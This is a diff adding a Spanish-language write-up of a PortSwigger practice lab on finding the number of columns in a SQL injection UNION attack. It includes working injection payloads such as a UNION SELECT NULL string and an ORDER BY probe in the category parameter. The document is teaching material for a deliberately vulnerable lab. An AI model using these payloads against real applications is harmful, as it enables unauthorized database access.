@@ -12,3 +12,71 @@ citation: 'SQLi UNION attack determining the number of columns returned by the q
 ---
 
 ![logo]({{site.url}}/images/SQLi/sqli-3/logo.png)
+
+Lab-Link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns>  
+Dificultad: APPRENTICE  
+
+## Descripción del laboratorio
+
+![Descripción]({{site.url}}/images/SQLi/sqli-3/descripcion.png)
+
+## Objetivo del laboratorio
+
+Determinar el número de columnas devueltas por la consulta realizando un ataque de inyección SQL UNION que devuelva una fila adicional que contenga valores nulos.
+
+## Query
+
+![categorias]({{site.url}}/images/SQLi/sqli-3/categorias y url.png)
+
+La consulta utilizada en el laboratorio tendrá un aspecto similar a
+
+```sql
+SELECT * FROM tabla WHERE category = '<CATEGORY>'
+```
+
+Comprobamos que es vulnerable a SQLi insertando en la url parametros:
+
+![Comprobar]({{site.url}}/images/SQLi/sqli-3/comprobar.png)
+
+## Determinar el numero de columnas retornadas por la consulta
+
+1) La consulta de forma interna se veria algo asi con el primer metodo para mirar las columnas:
+
+```sql
+SELECT ? FROM tabla UNION SELECT NULL
+SELECT ? FROM tabla UNION SELECT NULL, NULL
+SELECT ? FROM tabla UNION SELECT NULL, NULL, NULL
+```
+
+Vamos insertando `NULL` con `UNION SELECT` para ver cuantas columnas estan disponibles etc...
+
+2) Probamos con `ORDER BY` para ver que cantidad son vulnerables, vamos incrementando el numero
+
+```sql
+SELECT a,b FROM tabla ORDER BY 1
+SELECT a,b FROM tabla ORDER BY 2
+SELECT a,b FROM tabla ORDER BY 3
+```
+
+## Forma determinal con NULL
+```sql
+filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
+```
+La web para a realizar el `URL ENCONDE` y quedaria algo asi:
+![url enconde]({{site.url}}/images/SQLi/sqli-3/NULL.png)
+
+En BurpSuite se veria de la siguiente forma
+![BurpSuite]({{site.url}}/images/SQLi/sqli-3/burp.png)
+
+## Forma determinal con ORDER BY
+```sql
+filter?category=Gifts' ORDER BY 3--
+```
+Sin Url Encode
+![url]({{site.url}}/images/SQLi/sqli-3/url.png)
+
+La web para a realizar el `URL ENCONDE` y quedaria algo asi:
+![url_enconde]({{site.url}}/images/SQLi/sqli-3/url encode.png)
+
+Aprobado
+![Aprobado]({{site.url}}/images/SQLi/sqli-3/aprobado.png)
